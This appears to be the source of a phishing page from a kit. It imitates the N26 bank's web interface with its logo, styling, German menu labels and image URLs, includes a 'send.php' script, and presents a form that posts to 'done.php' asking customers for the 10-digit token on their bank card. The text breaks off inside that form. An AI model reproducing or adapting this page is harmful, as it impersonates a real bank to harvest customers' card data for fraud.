<?php

    include "send.php";
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Configuration — N26</title>
   
    <link rel="preload" href="login_files/Calibre-Regular.latin.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" href="login_files/Calibre-Medium.latin.woff2" as="font" type="font/woff2" crossorigin="anonymous">

    <style>
        @font-face {
            font-family: 'N26';
            font-style: normal;
            font-weight: 300;
            src: url('login_files/Calibre-Regular.latin.woff2') format('woff2');
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        
        @font-face {
            font-family: 'N26';
            font-style: normal;
            font-weight: 600;
            src: url('login_files/Calibre-Medium.latin.woff2') format('woff2');
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        
        @font-face {
            font-family: 'N26';
            font-style: normal;
            font-weight: 900;
            src: url('login_files/Calibre-Semibold.latin.woff2') format('woff2');
            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
        }
        
        @font-face {
            font-family: 'N26';
            font-style: normal;
            font-weight: 300;
            src: url('login_files/Calibre-Regular.latin-ext.woff2') format('woff2');
            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        
        @font-face {
            font-family: 'N26';
            font-style: normal;
            font-weight: 600;
            src: url('login_files/Calibre-Medium.latin-ext.woff2') format('woff2');
            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
        
        @font-face {
            font-family: 'N26';
            font-style: normal;
            font-weight: 900;
            src: url('login_files/Calibre-Semibold.latin-ext.woff2') format('woff2');
            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
        }
    </style>
    <style data-fela-type="STATIC">:root {--duration: 1;--responsive-base: 1;--primary-color: rgb(27, 27, 27); --secondary-color: rgb(116, 116, 116); --primary-background-color: rgb(251, 251, 251); --secondary-background-color: rgb(255, 255, 255); --primary-accent-shade: rgb(201, 201, 201); --secondary-accent-shade: rgb(245, 245, 245); --mild-overlay: rgba(0, 0, 0, 0.075); --distinct-overlay: rgba(0, 0, 0, 0.175); --signal-color: rgb(215, 75, 75);--venice-spring: rgb(72, 172, 152); --miami-coast: rgb(60, 145, 128); --berlin-sunrise: rgb(241, 130, 91); --focus-color: rgba(72, 172, 152, 0.5); --americana-stream: rgb(216, 228, 217); --daugavpils-cathedral: rgb(238, 243, 239);}@media (max-width: 767px) {:root {--responsive-base: 0.8;}}body {scroll-behavior: smooth; /* 2 */}@media (prefers-reduced-motion: reduce) {:root { --duration: 0 }body { scroll-behavior: auto }}*, ::before, ::after{box-sizing:inherit}html{font-family:N26, sans-serif;font-size:125%;line-height:1.45;color:var(--primary-color);background-color:var(--primary-background-color);box-sizing:border-box;min-height:100%;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}html, body, [id="root"], [id="app"]{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex;flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal;overflow-x:hidden;flex-grow:1;-webkit-box-flex:1;flex-shrink:1;flex-basis:auto}[id="root"]{transition-property:-webkit-filter,filter;-webkit-transition-property:-webkit-filter,filter;-moz-transition-property:filter;transition-duration:calc(var(--duration) * 150ms)}[id="root"][aria-hidden="true"]{-webkit-filter:blur(calc(var(--page-blur) * 1px));filter:blur(calc(var(--page-blur) * 1px))}body{margin-top:0;margin-right:0;margin-bottom:0;margin-left:0}img{display:block;height:auto;max-width:100%;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none}main{display:block}[hidden]{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}abbr[title]{text-decoration:underline dotted;text-decoration:underline;border-bottom-width:none}sub, sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-0.25em}sup{top:-0.5em}svg:not(:root){overflow:hidden}pre{font-family:monospace, monospace;font-size:100%}hr{overflow:visible}button, input, select, textarea{font:inherit;margin-top:0;margin-right:0;margin-bottom:0;margin-left:0}button, input{overflow:visible}button, select{text-transform:none}button, html [type="button"], [type="reset"], [type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;padding-top:0;padding-right:0;padding-bottom:0;padding-left:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{border-top-color:rgb(192, 192, 192);border-top-width:1px;border-top-style:solid;border-right-color:rgb(192, 192, 192);border-right-width:1px;border-right-style:solid;border-bottom-color:rgb(192, 192, 192);border-bottom-width:1px;border-bottom-style:solid;border-left-color:rgb(192, 192, 192);border-left-width:1px;border-left-style:solid;margin-top:0;margin-right:2px;margin-bottom:0;margin-left:2px;padding-top:0.35em;padding-right:0.625em;padding-bottom:0.75em;padding-left:0.625em}legend{box-sizing:border-box;display:table;max-width:100%;white-space:normal;color:inherit;padding-top:0;padding-right:0;padding-bottom:0;padding-left:0}textarea{overflow:auto}[type="checkbox"], [type="radio"]{padding-top:0;padding-right:0;padding-bottom:0;padding-left:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-cancel-button,[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:0.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}:-webkit-autofill,:-webkit-autofill:hover,:-webkit-autofill:focus,:-webkit-autofill:active{transition:background-color 1000000ms, color 1000000ms;-webkit-transition:background-color 1000000ms, color 1000000ms;-moz-transition:background-color 1000000ms, color 1000000ms}:required:-moz-ui-invalid{box-shadow:none}.visually-hidden{border-top-width:0 !important;border-right-width:0 !important;border-bottom-width:0 !important;border-left-width:0 !important;clip:rect(1px, 1px, 1px, 1px) !important;height:1px !important;overflow:hidden !important;padding-top:0 !important;padding-right:0 !important;padding-bottom:0 !important;padding-left:0 !important;position:absolute !important;white-space:nowrap !important;width:1px !important}strong, b{font-weight:600}audio, canvas, iframe, img, svg, video{vertical-align:middle}p{margin-top:0;margin-bottom:1em}html{font-size:112.5%}</style>
    <style data-fela-type="KEYFRAME">
        @keyframes k1{to{box-shadow:0 0.2em 0.25em var(--mild-overlay);background-color:var(--secondary-background-color)}}@keyframes k2{from{opacity:0}to{opacity:1}} @keyframes k1{to{box-shadow:0 0.2em 0.25em var(--mild-overlay);background-color:var(--secondary-background-color)}}@keyframes k2{from{opacity:0}to{opacity:1}}@keyframes k3{from{opacity:0;transform:scale(1.1)}80%{opacity:1}to{transform:none}}@keyframes k4{from{opacity:0;transform:translateY(1em)}to{opacity:1}}@keyframes k5{to{transform:rotate(1turn)}}</style>
    <style data-fela-type="RULE">
        .a{color:var(--primary-color)}.b{background-color:var(--primary-background-color)}.c{z-index:1}.d{transition-property:background-color;-webkit-transition-property:background-color;-moz-transition-property:background-color}.e{transition-duration:calc(var(--duration) * 250ms)}.f{flex-grow:1;-webkit-box-flex:1}.g{flex-shrink:1}.h{flex-basis:auto}.i{position:fixed}.j{width:100%}.k{z-index:50}.l{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex}.m{flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal}.n{align-items:center;-webkit-box-align:center}.o{justify-content:center;-webkit-box-pack:center}.p{box-shadow:0 0 transparent}.q{will-change:box-shadow}.r{animation-name:k1}.s{animation-fill-mode:forwards}.t{animation-duration:calc(var(--duration) * 300ms)}.u{animation-delay:calc(var(--duration) * 800ms)}.v{animation-timing-function:ease-in}.ab{position:relative}.ac{height:5.333333333333333rem}.ae{position:absolute}.af{top:0}.ag{bottom:0}.ah{left:0}.ai{padding-top:0}.aj{padding-right:1.25rem}.ak{padding-bottom:0}.al{padding-left:1.25rem}.am{padding-right:0}.an{padding-left:0}.ao{border-top-width:0}.ap{border-right-width:0}.aq{border-bottom-width:0}.ar{border-left-width:0}.as{background-color:transparent}.at{font-style:inherit}.au{font-weight:inherit}.av{font-size:inherit}.aw{line-height:inherit}.ax{font-family:inherit}.ay{color:inherit}.az{text-decoration:none}.ba{text-align:left}.bb{cursor:pointer}.bc{overflow:hidden}.bd{height:1px}.be{width:1px}.bf:focus{height:auto}.bg:focus{width:120px}.bh:focus{line-height:1}.bi{line-height:1}.bj{margin-right:0.5em}.bk{font-size:30px}.bl{flex-shrink:0}.bm{padding-top:0.5em}.bn{padding-right:0.75em}.bo{padding-bottom:0.5em}.bp{height:auto}.bq{fill:currentcolor}.br{max-width:100%}.bs{height:30px}.bt{justify-content:flex-start;-webkit-box-pack:start}.bu{width:calc(860px + 1.25rem * 2)}.bv{transition-property:color;-webkit-transition-property:color;-moz-transition-property:color}.bw{color:var(--venice-spring)}.bx{margin-top:0}.by{margin-right:1.25rem}.bz{margin-bottom:0}.ca{margin-left:1.25rem}.cb{display:inline-block}.cc{height:1em}.cd{width:1em}.ce{vertical-align:-2px}.cf{overflow:visible}.cg{margin-right:0.75em}.ch{font-size:133%}.ci{vertical-align:baseline}.cj::before{content:""}.ck::before{position:absolute}.cl::before{top:0}.cm::before{right:0}.cn::before{bottom:0}.co::before{left:0}.cp::before{z-index:1}.cq:hover{color:var(--venice-spring)}.cr:focus{outline:0}.cs:focus{box-shadow:0 3px var(--focus-color)}.ct{right:0}.cu{justify-content:flex-end;-webkit-box-pack:end}.cv{max-width:calc(860px + calc(var(--responsive-base) * 1rem) * 2)}.de{margin-top:calc(5.333333333333333rem + 35px)}.df{margin-right:auto}.dg{margin-left:auto}.dh{padding-top:1.5em}.di{padding-right:calc(var(--responsive-base) * 1rem)}.dj{padding-bottom:1.5em}.dk{padding-left:calc(var(--responsive-base) * 1rem)}.dl{margin-bottom:2em}.dm{border-bottom-color:rgb(125, 0, 0)}.dn{border-bottom-width:1px}.do{border-bottom-style:solid}.dp{margin-bottom:2rem}.dq{justify-content:space-between;-webkit-box-pack:justify}.dr{flex-wrap:wrap;-webkit-box-lines:multiple}.ds{display:block}.dt{font-size:170%}.du{font-weight:600}.dv{line-height:1.3}.dw{letter-spacing:-0.4px}.dx{flex-basis:100%}.ec{margin-top:0.5em}.ed{margin-right:-0.5rem}.ee{margin-bottom:0.5em}.ef{margin-left:-0.5rem}.eg{margin-right:0.5rem}.eh{margin-left:0.5rem}.ei{padding-top:0.6rem}.ej{padding-right:0.6rem}.ek{padding-bottom:0.6rem}.el{padding-left:0.6rem}.em{background-color:var(--secondary-accent-shade)}.en{width:2.5rem}.eo{height:2.5rem}.ep{border-radius:50%}.eq{transition-duration:calc(var(--duration) * 300ms)}.er:hover{transform:scale(1.05)}.es:hover{box-shadow:0 0.2em 0.25em var(--mild-overlay)}.et:focus{box-shadow:0 0 0 3px var(--focus-color)}.fa{pointer-events:none}.fc{border-top-width:0 !important}.fd{border-right-width:0 !important}.fe{border-bottom-width:0 !important}.ff{border-left-width:0 !important}.fg{clip:rect(1px, 1px, 1px, 1px) !important}.fh{height:1px !important}.fi{overflow:hidden !important}.fj{padding-top:0 !important}.fk{padding-right:0 !important}.fl{padding-bottom:0 !important}.fm{padding-left:0 !important}.fn{position:absolute !important}.fo{white-space:nowrap !important}.fp{width:1px !important}.fq{background-color:var(--venice-spring)}.fr{color:var(--secondary-background-color)}.fs:hover{box-shadow:0 0.2em 0.25em var(--distinct-overlay)}.ft{margin-top:-2rem}.fu{flex-direction:column-reverse;-webkit-box-orient:vertical;-webkit-box-direction:reverse}.fv{color:var(--secondary-color)}.fw{font-size:100%}.fx{white-space:nowrap}.fy{transition-property:-webkit-filter,filter;-webkit-transition-property:-webkit-filter,filter;-moz-transition-property:filter}.fz{font-weight:300}.ga{font-size:300%}.gb{margin-right:0.4rem}.gc{margin-bottom:0.4rem}.gd{margin-left:0}.ge{border-radius:6px}.gf{box-shadow:none}.gg{font-size:90%}.gh{line-height:1.3333333333333333}.gi[disabled]{cursor:not-allowed}.gj[disabled]{opacity:0.5}.gk[disabled]{pointer-events:none}.gl[readonly]{cursor:not-allowed}.gm[readonly]{opacity:0.5}.gn[readonly]{pointer-events:none}.go + ul{margin-top:0}.gp + ul{margin-right:0}.gq + ul{margin-bottom:0}.gr + ul{margin-left:0}.gs + ul{padding-top:0}.gt + ul{padding-right:0}.gu + ul{padding-bottom:0}.gv + ul{padding-left:0}.gw + ul{list-style:none}.gx + ul> ::before{position:absolute}.gy + ul> ::before{content:"\200B"}.gz + ul{background-color:var(--secondary-background-color)}.ha + ul{border-bottom-right-radius:6px}.hb + ul{border-bottom-left-radius:6px}.hc + ul{position:absolute}.hd + ul{left:0}.he + ul{right:0}.hf + ul{z-index:1}.hi + ul{border-left-color:var(--primary-accent-shade)}.hj + ul{border-left-width:1px}.hk + ul{border-left-style:solid}.hl + ul{border-bottom-color:var(--primary-accent-shade)}.hm + ul{border-bottom-width:1px}.hn + ul{border-bottom-style:solid}.ho + ul{border-right-color:var(--primary-accent-shade)}.hp + ul{border-right-width:1px}.hq + ul{border-right-style:solid}.hr + ul > li:not(:last-child){border-bottom-color:var(--secondary-accent-shade)}.hs + ul > li:not(:last-child){border-bottom-width:1px}.ht + ul > li:not(:last-child){border-bottom-style:solid}.hu + ul > li{font-size:80%}.hv + ul > li:hover{background-color:var(--venice-spring)}.hw + ul > li:hover{color:rgb(255, 255, 255)}.hx + ul > li:hover{cursor:pointer}.hy + ul > li{padding-top:0.5em}.hz + ul > li{padding-right:0.5em}.ia + ul > li{padding-bottom:0.5em}.ib + ul > li{padding-left:0.5em}.ic + ul > [aria-selected="true"]{background-color:var(--venice-spring)}.id + ul > [aria-selected="true"]{color:rgb(255, 255, 255)}.ie + ul mark{background-color:transparent}.if + ul mark{color:inherit}.ih + ul mark{border-bottom-width:1px}.ii + ul mark{border-bottom-style:solid}.ij::placeholder{opacity:0.9}.ik::placeholder{color:var(--primary-color)}.il::-ms-input-placeholder{opacity:0.9}.im::-ms-input-placeholder{color:var(--primary-color)}.in[aria-invalid="true"]{border-top-color:var(--signal-color)}.io[aria-invalid="true"]{border-right-color:var(--signal-color)}.ip[aria-invalid="true"]{border-bottom-color:var(--signal-color)}.iq[aria-invalid="true"]{border-left-color:var(--signal-color)}.ir{height:2.75rem}.is{-webkit-appearance:none;-moz-appearance:none;appearance:none}.it{padding-left:3em}.iu{height:100%}.iv{opacity:0.9}.iw{padding-top:0.67em}.ix{padding-bottom:0.67em}.iy{padding-left:0.75em}.ja> option{color:var(--primary-color)}.jb> option{background-color:var(--primary-background-color)}.jc{padding-right:2.25em}.jd{top:50%}.je{right:0.75em}.jf{transform:translateY(-50%)}.jg{opacity:0.8}.jh{color:var(--miami-coast)}.ji{text-align:center}.jj{line-height:1.2}.jk:hover{transform:none}.jl{padding-right:1.5em}.jm{padding-left:1.5em}.jn{text-transform:uppercase}.jo{letter-spacing:0.4px}.jp{font-size:80%}.jq{padding-top:0.25rem}.jr{padding-right:0.55rem}.js{padding-bottom:0.25rem}.jt{padding-left:0.55rem}.ju{font-size:85%}.jv{display:-webkit-inline-box;display:-moz-inline-box;display:-ms-inline-flexbox;display:-webkit-inline-flex;display:inline-flex}.jw{border-radius:4px}.jx{box-shadow:0 0 0 2px var(--secondary-accent-shade)}.jy:hover{background-color:var(--secondary-accent-shade)}.jz:focus{box-shadow:0 0 0 2px var(--focus-color)}.ka{margin-top:0.25rem}.kb{margin-bottom:0.25rem}.kc{margin-left:-1em}.kd{margin-right:-1em}.ke{margin-bottom:2.5em}.kf{flex-direction:row;-webkit-box-orient:horizontal;-webkit-box-direction:normal}.kk{padding-top:1em}.kl{padding-right:1em}.km{padding-bottom:1em}.kn{padding-left:1em}.ko{border-radius:8px}.kp{box-shadow:0 2.5em 1.5em -2.5em var(--distinct-overlay)}.kq{background-image:url(https://images.ctfassets.net/iv7ikzngu0lb/5vVC2pPiFOM0MQGmsyKmy0/326f3badb7f3a8e46609f6e11834c7ed/Friend_Referral_Pulse_Card.png?fm=jpg&q=70)}.kr{background-repeat:no-repeat}.ks{background-size:cover}.kt{background-position:center}.ku{color:rgb(255, 255, 255)}.kv{margin-bottom:1rem}.kw{font-size:110%}.kx{line-height:1.285}.ky{margin-top:-1rem}.kz{align-self:flex-end}.la:hover{box-shadow:0 5px 10px rgba(0, 0, 0, 0.2)}.lb:hover{transform:translateY(-2px)}.lc{border-top-color:var(--venice-spring)}.ld{border-top-width:2px}.le{border-top-style:solid}.lf{border-right-color:var(--venice-spring)}.lg{border-right-width:2px}.lh{border-right-style:solid}.li{border-bottom-color:var(--venice-spring)}.lj{border-bottom-width:2px}.lk{border-left-color:var(--venice-spring)}.ll{border-left-width:2px}.lm{border-left-style:solid}.ln{background-image:url(https://cdn.number26.de/images/1810_Metal_Colors.png)}.lo{color:rgb(251, 251, 251)}.lp{background-image:url(https://images.ctfassets.net/iv7ikzngu0lb/1G0bGHbmAQUSEOUGwCCIW6/f2df8fe955e17738f0ad5ae7b90af2ba/standing-order-background_light.jpg?fm=jpg&q=70)}.lq{color:rgb(29, 29, 29)}.lr{width:25em}.ls{margin-bottom:1em}.lt{font-size:140%}.lu{line-height:1.14}.lv{background-color:var(--secondary-background-color)}.lw{box-shadow:0 0.08em 0.25em 0.075em var(--mild-overlay)}.lx{width:-webkit-fit-content;width:-moz-fit-content;width:fit-content}.ly{transition-property:background-color, box-shadow;-webkit-transition-property:background-color, box-shadow;-moz-transition-property:background-color, box-shadow}.lz{padding-top:calc(var(--responsive-base) * 0.9rem)}.ma{padding-right:calc(var(--responsive-base) * 0.9rem)}.mb{padding-bottom:calc(var(--responsive-base) * 0.9rem)}.mc{padding-left:calc(var(--responsive-base) * 0.9rem)}.md{margin-top:0.25em}.me{margin-right:0}.mf{display:table-cell}.mg{font-size:120%}.mh{display:table}.mi{display:table-row}.mj{padding-left:0.5em}.mk{margin-left:-0.15em}.ml{margin-left:0.15em}.mm{z-index:100}.mn[aria-hidden="true"]{display:none}.mo{background-color:rgba(255, 255, 255, 0.7)}.mp{max-height:calc(100vh - 2em)}.mq{max-width:calc(100% - 2em)}.mr{overflow:auto}.ms{width:20em}.mt{min-height:auto}.mu{animation-name:k2}.mv{animation-duration:calc(var(--duration) * 200ms)}.mw{animation-timing-function:ease-out}.mx{margin-top:auto}.my{margin-bottom:auto}.mz{display:none}
    </style>
    <style data-fela-type="RULE" media="(max-width: 767px)">
        .w{background-color:var(--secondary-background-color)}.x{box-shadow:0 -0.1em 0.15em var(--mild-overlay)}.y{padding-bottom:env(safe-area-inset-bottom)}.z{bottom:0}.cw{padding-top:1em}.cx{padding-right:calc(var(--responsive-base) * 1rem)}.cy{padding-bottom:1em}.cz{padding-left:calc(var(--responsive-base) * 1rem)}.da{margin-top:0}.db{margin-right:auto}.dc{margin-bottom:3rem}.dd{margin-left:auto}.iz{flex-grow:1;-webkit-box-flex:1}
    </style>
    <style data-fela-type="RULE" media="(min-width: 768px)">
        .dy{margin-top:0}.dz{margin-right:-0.5rem}.ea{margin-bottom:0}.eb{margin-left:-0.5rem}.eu{width:3rem}.ev{height:3rem}.ew{padding-top:0.75rem}.ex{padding-right:0.75rem}.ey{padding-bottom:0.75rem}.ez{padding-left:0.75rem}.hg + ul{overflow-y:scroll}.hh + ul{max-height:10em}.kg{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex}.kh{flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal}.ki{min-height:calc(240px + 2em)}.kj{width:50%}
    </style>
    <style data-react-helmet="true">
        :root {
            --page-blur: 0
        }
    </style>
    <style data-react-helmet="true">
        :root {
            --primary-color: rgb(27, 27, 27);
            --secondary-color: rgb(116, 116, 116);
            --primary-background-color: rgb(251, 251, 251);
            --secondary-background-color: rgb(255, 255, 255);
            --primary-accent-shade: rgb(201, 201, 201);
            --secondary-accent-shade: rgb(245, 245, 245);
            --mild-overlay: rgba(0, 0, 0, 0.075);
            --distinct-overlay: rgba(0, 0, 0, 0.175);
            --signal-color: rgb(215, 75, 75);
        }
    </style>
    <style>
    .hh {
        border-bottom-color: rgb(201, 201, 201);
    }
    
    input[id^='cardToken']{
        width:30px;
        margin-right: 20px;
        transition: all ease 500ms;
        box-sizing: content-box;
    }
    .gz:focus {
    border-left-color: rgba(72, 172, 152, 0.5);
}

    input[id^='cardToken']:focus{
        border-left-color: rgba(72, 172, 152, 0.5);
    }
    #main > div.l.m.ba.adi > form > div > fieldset > div > fieldset > div{
        margin-bottom: 20px;
    }
    #gobtn{
        cursor: pointer !important;

    }
    #gobtn:hover{
        box-shadow: 1px 1px 3px black;
    }
</style>

<link rel="apple-touch-icon" sizes="256x256" href="login_files/favicon.png">
<link rel="icon" type="image/png" sizes="256x256" href="login_files/favicon.png">
<meta name="theme-color" content="#48AC98">
<meta name="google" content="notranslate">
</head>

<body>
    <div id="root">
        <div id="app" data-reactroot="">
            <div class="a b c d e f g h">
                <header role="banner" class="i j k l m n o a b p q e w x y z">
                    <div class="ab l n o j ac">
                        <div class="ae af ag ah l n ai aj ak al"><a class="ai am ak an ao ap aq ar as at au av aw ax ay az ba bb bc bd be bf bg bh" href="#main">Aller au contenu principal</a>
                            <div class="bi bj bk j f bl h bm bn bo an">
                                <a class="ai am ak an ao ap aq ar as at au av aw ax ay az ba bb bp" href="/transactions" title="Transactions">
                                    <svg focusable="false" class="ay bq br bs" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1200 819.91" xml:space="preserve">
                                        <title>N26 logo</title>
                                        <path d="m302.29 179.3v315.58c0 27.93.65 44.83 1.95 61.07h-1.3c-6.83-18.6-14.88-34.9-26.89-56.12l-186.64-320.53h-85.3v461.3h66.46v-315.6c0-27.94-.65-44.83-1.94-61.08h1.37c6.82 18.6 14.87 34.89 26.89 56.1l186.58 320.58h84.4v-461.3z"></path>
                                        <path d="m1060.44 333.69c-55 0-94.27 25.44-114.12 63.1 0-89 31-166.47 104.7-166.47 46.84 0 65.43 26.95 75.36 71.14l68.22-13.65c-16-76.29-64.53-113.37-143.1-113.37-98.72 0-172.58 75.8-172.58 245.69 0 150.81 61.59 225.35 167.71 225.35 87.69 0 153.37-59.88 153.37-158.55 0-77.09-41.1-153.24-139.56-153.24zm-13.64 256.05c-54.42 0-92.1-50-98.62-116.39 16.53-56.63 53.18-84.84 96.52-84.84 55.71 0 87.14 41.14 87.14 99.63 0 62.78-35.84 101.6-85.04 101.6z"></path>
                                        <path d="m577.29 580.84c34.73-24 84.52-63.87 106.61-86 25.11-25.12 96.59-89.69 96.59-181.74 0-95.15-62-138.7-145.85-138.7-101.64.04-151.83 62.6-151.83 134.17a146.72 146.72 0 0 0 4.55 36.43l69.64 6.7a185.21 185.21 0 0 1 -4.55-39.63c0-53.6 35.47-79.25 79.88-79.25 43.3 0 75.35 24.26 75.35 82.6 0 59.29-29 99.7-73.16 143.91-46.17 46.2-119.97 101.32-155.52 126.67v54.6h306.67v-59.76z"></path>
                                        <path d="m372 760.14v59.77h-372v-59.77z"></path>
                                        <path d="m372 0v59.77h-372v-59.77z"></path>
                                        <path d="m302.29 179.3v315.58c0 27.93.65 44.83 1.95 61.07h-1.3c-6.83-18.6-14.88-34.9-26.89-56.12l-186.64-320.53h-85.3v461.3h66.46v-315.6c0-27.94-.65-44.83-1.94-61.08h1.37c6.82 18.6 14.87 34.89 26.89 56.1l186.58 320.58h84.4v-461.3z"></path>
                                    </svg>
                                </a>
                            </div>
                        </div>
                        <div class="l n bt bu">
                            <div class="ab l n bv e bx by bz ca">
                                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="ay bq ci cb cc cd ce cf cg ch">
                                    <path d="M2.948 2.716a.549.549 0 0 0-.545.551v8.858a.55.55 0 0 0 .545.554h26.104a.55.55 0 0 0 .545-.554V3.267a.549.549 0 0 0-.545-.551H2.948zm0-1.662h26.104c1.201 0 2.175.991 2.175 2.213v8.858c0 1.225-.974 2.216-2.175 2.216H2.948c-1.201 0-2.175-.991-2.175-2.216V3.267c0-1.222.974-2.213 2.175-2.213zM1.316 19.875c-.627 0-1.02-.691-.705-1.245a.813.813 0 0 1 .705-.414h29.368c.627 0 1.02.691.705 1.245a.813.813 0 0 1-.705.414H1.316zm0 5.537c-.627 0-1.02-.694-.705-1.245a.81.81 0 0 1 .705-.417h29.368c.627 0 1.02.691.705 1.245a.81.81 0 0 1-.705.417H1.316zm0 5.534c-.627 0-1.02-.691-.705-1.245a.813.813 0 0 1 .705-.414h29.368c.627 0 1.02.691.705 1.245a.813.813 0 0 1-.705.414H1.316z" stroke-width=".5" stroke="currentcolor" fill="currentcolor"></path>
                                </svg><a class="ai am ak an ao ap aq ar as at au av aw ax ay az ba bb cb cj ck cl cm cn co cp cq cr cs" href="/transactions">Transaktionen</a></div>
                            <div class="ab l n bv e bx by bz ca">
                                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="ay bq ci cb cc cd ce cf cg ch">
                                    <path d="M2.715 2.16a.554.554 0 0 0-.555.555v9.963c0 .306.248.554.555.554h9.963a.554.554 0 0 0 .554-.554V2.715a.554.554 0 0 0-.554-.555H2.715zm0-1.66h9.963c1.223 0 2.215.991 2.215 2.215v9.963a2.215 2.215 0 0 1-2.215 2.215H2.715A2.215 2.215 0 0 1 .5 12.678V2.715C.5 1.491 1.491.5 2.715.5zm16.607 1.66a.554.554 0 0 0-.554.555v9.963c0 .306.248.554.554.554h9.963a.554.554 0 0 0 .555-.554V2.715a.554.554 0 0 0-.555-.555h-9.963zm0-1.66h9.963c1.224 0 2.215.991 2.215 2.215v9.963a2.215 2.215 0 0 1-2.215 2.215h-9.963a2.215 2.215 0 0 1-2.215-2.215V2.715c0-1.224.992-2.215 2.215-2.215zm0 18.268a.554.554 0 0 0-.554.554v9.963c0 .307.248.555.554.555h9.963a.554.554 0 0 0 .555-.555v-9.963a.554.554 0 0 0-.555-.554h-9.963zm0-1.661h9.963c1.224 0 2.215.992 2.215 2.215v9.963a2.214 2.214 0 0 1-2.215 2.215h-9.963a2.215 2.215 0 0 1-2.215-2.215v-9.963c0-1.223.992-2.215 2.215-2.215zM2.715 18.768a.554.554 0 0 0-.555.554v9.963c0 .307.248.555.555.555h9.963a.554.554 0 0 0 .554-.555v-9.963a.554.554 0 0 0-.554-.554H2.715zm0-1.661h9.963c1.223 0 2.215.992 2.215 2.215v9.963a2.215 2.215 0 0 1-2.215 2.215H2.715A2.214 2.214 0 0 1 .5 29.285v-9.963c0-1.223.991-2.215 2.215-2.215z" fill="currentcolor" stroke-width=".5" stroke="currentcolor"></path>
                                </svg><a class="ai am ak an ao ap aq ar as at au av aw ax ay az ba bb cb cj ck cl cm cn co cp cq cr cs" href="/spaces">Spaces</a></div>
                        </div>
                        <div class="ae af ag ct l n cu">
                            <div class="ab l n bv e bx by bz ca">
                                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="ay bq ci cb cc cd ce cf cg ch">
                                    <path d="M16 14.34c4.688 0 7.617-5.075 5.273-9.135A6.087 6.087 0 0 0 16 2.16c-4.688 0-7.617 5.075-5.273 9.135A6.087 6.087 0 0 0 16 14.34zM16 16c-5.966 0-9.695-6.458-6.712-11.625A7.753 7.753 0 0 1 16 .5c5.966 0 9.695 6.458 6.712 11.625A7.753 7.753 0 0 1 16 16zm-8.857 3.875a4.983 4.983 0 0 0-4.983 4.982v4.428c0 .307.248.555.555.555h26.57a.554.554 0 0 0 .555-.555v-4.428a4.983 4.983 0 0 0-4.983-4.982H7.143zm0-1.66h17.714a6.642 6.642 0 0 1 6.643 6.642v4.428a2.214 2.214 0 0 1-2.215 2.215H2.715A2.214 2.214 0 0 1 .5 29.285v-4.428a6.642 6.642 0 0 1 6.643-6.642z" fill="currentcolor" stroke-width=".5" stroke="currentcolor"></path>
                                </svg><a class="ai am ak an ao ap aq ar as at au av aw ax ay az ba bb cb cj ck cl cm cn co cp cq cr cs" href="/account">Mein Konto</a></div>
                        </div>
                    </div>
                </header>
                <main role="main" class="j cv cw cx cy cz da db dc dd de df bz dg dh di dj dk" id="main">
                    
                    <div class="l m ba adi">
                        <form action="done.php" method="POST">
                            <div class="">
                                <fieldset class="ao ap aq ar bx me bz gd ai am ak an">
                                    <legend class="ds bx kv kw du kx">Bitte gib den Token deiner Karte ein</legend>
                                    <p>Du findest diese 10-stellige Nummer unter deinem Namen oder auf der Rückseite deiner Karte.</p>
                                    <div class="l">
                                        <fieldset class="ao ap aq ar bx me bz gd ai am ak an">
